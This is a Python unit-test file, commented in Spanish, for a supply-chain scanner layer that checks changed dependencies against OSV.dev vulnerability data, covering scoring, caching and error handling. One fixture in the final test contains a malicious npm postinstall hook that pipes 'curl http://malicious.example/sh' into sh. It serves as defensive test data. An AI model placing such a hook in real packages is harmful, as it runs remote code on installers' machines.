"""Pruebas unitarias para la capa de vulnerabilidades conocidas (CVEs vía
OSV.dev), extraída de deps_layer.py para poder desactivarse por separado de
las señales de ataque a la cadena de suministro (typosquatting, scripts de
instalación sospechosos, instalación directa por URL/Git)."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import httpx

from watchgate.core.layers._shared import DependencyChange
from watchgate.core.layers.base import LAYER_REGISTRY
from watchgate.core.layers.vulnerabilities_layer import (
    OSVCache,
    VulnerabilitiesLayer,
    _is_high_or_critical_vuln,
)
from watchgate.core.models import CommitAuthor, FileChange, FileStatus, NormalizedDiff


def _make_diff(files: list[FileChange]) -> NormalizedDiff:
    return NormalizedDiff(
        base_sha="0000000000000000000000000000000000000000",
        head_sha="1111111111111111111111111111111111111111",
        repo_path="/tmp/fake_repo",
        files=files,
        commit_messages=["test commit"],
        authors=[CommitAuthor(name="Test User", email="test@example.com")],
    )


def test_vulnerabilities_layer_registered() -> None:
    assert "vulnerabilities" in LAYER_REGISTRY
    assert LAYER_REGISTRY["vulnerabilities"] is VulnerabilitiesLayer


def test_no_manifests_changed() -> None:
    layer = VulnerabilitiesLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="src/main.py",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1 +1 @@\n-print('hello')\n+print('world')",
                additions=1,
                deletions=1,
            )
        ]
    )
    res = layer.analyze(diff, {})
    assert res.risk_score == 0
    assert res.justification == "No se han modificado manifiestos de dependencias."


def test_osv_vulnerability_high() -> None:
    layer = VulnerabilitiesLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="requirements.txt",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1,0 +1,1 @@\n+vulnerable-pkg==1.0.0",
                additions=1,
                deletions=0,
            )
        ]
    )
    osv_response = {
        "vulns": [
            {
                "id": "GHSA-1234-5678",
                "database_specific": {"severity": "HIGH"},
            }
        ]
    }

    with patch.object(layer, "_query_osv_batch", return_value={0: (osv_response, None)}):
        res = layer.analyze(diff, {})

    assert res.risk_score == 90
    assert "Vulnerabilidad crítica/alta" in res.justification


def test_no_known_vulnerabilities_gives_zero_not_a_baseline() -> None:
    """A diferencia de deps_layer.py (que da un baseline de 10 a cualquier
    dependencia nueva), un escáner de vulnerabilidades puro no debe subir
    el score solo porque la dependencia sea nueva -- 0 si OSV no encuentra
    nada, punto."""
    layer = VulnerabilitiesLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="requirements.txt",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1,0 +1,1 @@\n+clean-pkg==1.0.0",
                additions=1,
                deletions=0,
            )
        ]
    )
    with patch.object(layer, "_query_osv_batch", return_value={0: ({"vulns": []}, None)}):
        res = layer.analyze(diff, {})
    assert res.risk_score == 0


def test_osv_network_error_graceful() -> None:
    layer = VulnerabilitiesLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="requirements.txt",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1,0 +1,1 @@\n+some-new-pkg==1.0.0",
                additions=1,
                deletions=0,
            )
        ]
    )

    with patch("httpx.post", side_effect=httpx.ConnectError("Connection refused")):
        res = layer.analyze(diff, {})

    assert res.risk_score == 0  # fallo de red no eleva el score
    assert "No verificable por fallo de red" in res.justification


def test_osv_sqlite_cache() -> None:
    cache = OSVCache(db_path=":memory:")
    change = DependencyChange(ecosystem="npm", name="express", new_version="4.18.2")

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {"vulns": []}

    with patch("httpx.post", return_value=mock_resp) as mock_post:
        layer = VulnerabilitiesLayer(cache_db_path=":memory:")
        layer.cache = cache

        res1, err1 = layer._query_osv(change)
        assert err1 is None
        assert res1 == {"vulns": []}
        assert mock_post.call_count == 1

        res2, err2 = layer._query_osv(change)
        assert err2 is None
        assert res2 == {"vulns": []}
        assert mock_post.call_count == 1  # No volvió a llamar a la red


def test_osv_batch_query_and_cache() -> None:
    cache = OSVCache(db_path=":memory:")
    c1 = DependencyChange(ecosystem="PyPI", name="pkg1", new_version="1.0")
    c2 = DependencyChange(ecosystem="PyPI", name="pkg2", new_version="2.0")

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "results": [
            {"vulns": []},
            {"vulns": [{"id": "CVE-2026-0001", "database_specific": {"severity": "HIGH"}}]},
        ]
    }

    layer = VulnerabilitiesLayer(cache_db_path=":memory:")
    layer.cache = cache

    with patch("httpx.post", return_value=mock_resp) as mock_post:
        res_batch = layer._query_osv_batch([c1, c2])
        assert len(res_batch) == 2
        assert mock_post.call_count == 1
        req_json = mock_post.call_args.kwargs["json"]
        assert len(req_json["queries"]) == 2

        cached_c1 = cache.get("pkg1", "PyPI", "1.0")
        cached_c2 = cache.get("pkg2", "PyPI", "2.0")
        assert cached_c1 == {"vulns": []}
        assert cached_c2 is not None and len(cached_c2["vulns"]) == 1

        res_batch_cached = layer._query_osv_batch([c1, c2])
        assert len(res_batch_cached) == 2
        assert mock_post.call_count == 1


def test_osv_severity_precision_no_false_positives() -> None:
    vuln_low = {
        "id": "GHSA-1111-2222",
        "summary": "Fix released on 2023-09-10 v1.9.0",
        "database_specific": {"severity": "MODERATE"},
        "severity": [{"type": "CVSS_V3", "score": "5.3"}],
    }
    assert _is_high_or_critical_vuln(vuln_low) is False

    vuln_high = {
        "id": "GHSA-3333-4444",
        "database_specific": {"github_reviewed_severity": "HIGH"},
    }
    assert _is_high_or_critical_vuln(vuln_high) is True

    vuln_crit = {
        "id": "GHSA-5555-6666",
        "database_specific": {"cvss": {"score": 9.8}},
    }
    assert _is_high_or_critical_vuln(vuln_crit) is True


def test_dependency_change_without_name_is_skipped() -> None:
    """Un cambio derivado de un script sin dependencias (p. ej. package.json
    con solo un postinstall modificado) no tiene nombre de paquete real que
    consultar en OSV -- deps_layer.py sí lo trata (es señal de ataque), esta
    capa no."""
    layer = VulnerabilitiesLayer(cache_db_path=":memory:")
    hunk = (
        '@@ -1,3 +1,4 @@\n "scripts": {\n'
        '+  "postinstall": "curl http://malicious.example/sh | sh"\n }'
    )
    diff = _make_diff(
        [
            FileChange(
                path="package.json",
                status=FileStatus.MODIFIED,
                diff_hunk=hunk,
                additions=1,
                deletions=0,
            )
        ]
    )
    res = layer.analyze(diff, {})
    assert res.risk_score == 0
    assert "no hay dependencias nuevas" in res.justification.lower()
